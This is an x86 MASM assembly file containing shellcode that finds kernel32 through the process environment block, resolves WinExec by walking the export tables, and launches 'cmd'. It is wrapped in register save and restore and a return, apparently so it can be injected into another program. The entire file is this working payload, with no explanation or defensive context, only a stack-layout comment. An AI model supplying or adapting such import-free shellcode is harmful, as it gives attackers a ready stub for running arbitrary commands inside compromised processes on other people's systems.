    .386
    .MODEL Flat, STDCALL
    option casemap:none             ; Treat labels as case-sensitive

.CODE
start:
incode segment
_start:    
    pushad
    
    ;Append data
    sub esp, 17h
    mov eax, 00646D63h
    mov [esp], eax
    mov eax, 456E6957h
    mov [esp+4], eax
    mov eax, 00636578h
    mov [esp+8], eax
    mov eax,  07h
    mov [esp+0Bh], eax
    
    ASSUME FS:NOTHING  
    mov ebx, fs:[30h]                               ;PEB
    mov ebx, [ebx + 0Ch]                            ;get PEB->Ldr
    mov ebx, [ebx + 14h]                            ;get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
    mov ebx, [ebx]                                  ;2nd Entry
    mov ebx, [ebx]                                  ;3rd Entry
    mov ebx, [ebx + 10h]                            ;Get Kernel32 Base
    mov [esp + 13h], ebx
    add ebx, [ebx+3Ch]                              ;PE header
    mov ebx, [ebx+78h]                              ;RVA of Export Directory
    add ebx, [esp + 13h]            ;VA of Export Directory
    mov [esp + 0Fh] , ebx
 
    ;Get WinExec Address
    lea edx,[esp + 4h]
    mov ecx,[esp + 0Bh]
    
    mov esi, [esp + 0Fh]
    mov esi, [esi + 20h]                        ;RVA of Export Name Table
    add esi, [esp + 13h]       ;VA of Export Name Table
    xor ebx, ebx
    cld                                         ;clear DF flag for string operations
 
    _next:
        inc ebx                                 ;next function name
        lodsd                                   ;get RVA of function name from name table [ESI:[0]
        add eax, [esp + 13h]     ;eax now points to the string of a function
        push esi                                ;preserve register for string compare operation
        mov esi, eax
        mov edi, edx
        cld
        push ecx                                ;preserve input length
        repe cmpsb                              ;compare function name [ESI] and input [EDI]
        pop ecx                                 ;recover input length
        pop esi
        jne _next                               ;if ecx != 0 after compare -> not equal

    dec ebx                                 ;decrease to get exactly index
    mov eax, [esp + 0Fh]
    mov eax, [eax + 24h]                      ;RVA of Export Ordinal Table
    add eax, [esp + 13h]     ;VA of Export Ordinal Table
    mov edx, [ebx*2+eax]
    movzx eax, dx                           ;eax now holds the ordinal of our function
    mov ebx, [esp + 0Fh]
    mov ebx, [ebx + 1Ch]                      ;RVA of Export Address Table
    add ebx, [esp + 13h]     ;VA of Export Address Table
    mov ebx, [eax*4+ebx]
    add ebx, [esp + 13h]
    mov eax, ebx
    
    mov  ecx, 1h
    push ecx
    lea ecx, [esp+4h]
    push ecx
    call eax
     
    add esp, 17h
    popad
    
    retn

;---------------------------------------------------------------;
;                           Stack                               ;
;esp    cmd                     db    "cmd",0
;+4     api_WinExec             db    "WinExec"
;+B     len_WinExec             dd    7
;+F     addr_ExportDir          dd    0
;+13    addr_Kernel32           dd    0
;---------------------------------------------------------------;
_end:
incode ends
end start
